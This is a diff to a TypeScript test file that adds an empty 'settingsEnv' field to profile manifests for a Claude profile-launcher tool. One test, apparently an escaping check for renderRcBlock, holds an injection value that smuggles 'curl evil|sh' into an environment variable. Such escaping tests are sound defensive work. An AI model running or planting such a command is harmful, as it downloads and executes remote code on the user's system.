@@ -6,10 +6,10 @@ import type { Manifest } from '../src/manifest.js'
 const m: Manifest = {
   version: 1, hub: null,
   profiles: [
-    { name: 'default', dir: '{home}/.claude', launcher: null, auth: 'oauth', env: {}, links: {}, mcp: [] },
+    { name: 'default', dir: '{home}/.claude', launcher: null, auth: 'oauth', env: {}, settingsEnv: {}, links: {}, mcp: [] },
     { name: 'z', dir: '{home}/.claude-z', launcher: 'cl-z', auth: 'env',
       env: { ANTHROPIC_AUTH_TOKEN: 'secret://z-token', ANTHROPIC_BASE_URL: 'https://api.z.ai/api/anthropic' },
-      links: {}, mcp: [] },
+      settingsEnv: {}, links: {}, mcp: [] },
   ],
   mcpServers: {},
 }
@@ -39,7 +39,7 @@ describe('renderRcBlock', () => {
     const evil: Manifest = {
       version: 1, hub: null,
       profiles: [{ name: 'x', dir: '{home}/.claude-x', launcher: 'cl-x', auth: 'env',
-        env: { BASE: 'http://h/$(curl evil|sh)`x`"end' }, links: {}, mcp: [] }],
+        env: { BASE: 'http://h/$(curl evil|sh)`x`"end' }, settingsEnv: {}, links: {}, mcp: [] }],
       mcpServers: {},
     }
     const posix = renderRcBlock(evil, mac)
